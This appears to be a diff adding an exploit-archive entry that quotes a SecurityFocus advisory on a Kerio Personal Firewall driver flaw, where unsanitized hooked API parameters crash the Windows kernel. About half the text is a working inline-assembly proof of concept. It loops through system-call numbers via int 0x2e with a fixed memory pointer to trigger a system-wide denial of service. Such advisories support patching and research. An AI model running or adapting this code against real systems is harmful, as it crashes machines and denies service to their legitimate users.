@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/11859/info
+
+It is reported that the Kerio Personal Firewall (KPF) driver does not sufficiently sanitize API parameters that are received from API's that are hooked by KPF. When the KPF API hook handles certain parameter data it will fail. Reports indicate that this exception is not expected and as a result, the Windows kernel crashes triggering a system wide denial of service.
+
+A local attacker may exploit this vulnerability to deny service to legitimate users.
+
+_asm{
+  xor ebx,ebx
+  start:
+  mov     eax,ebx
+  mov     edx,0x00010001 //writable mem area could be any value
+  int     0x2e
+  inc ebx
+  jmp start
+}
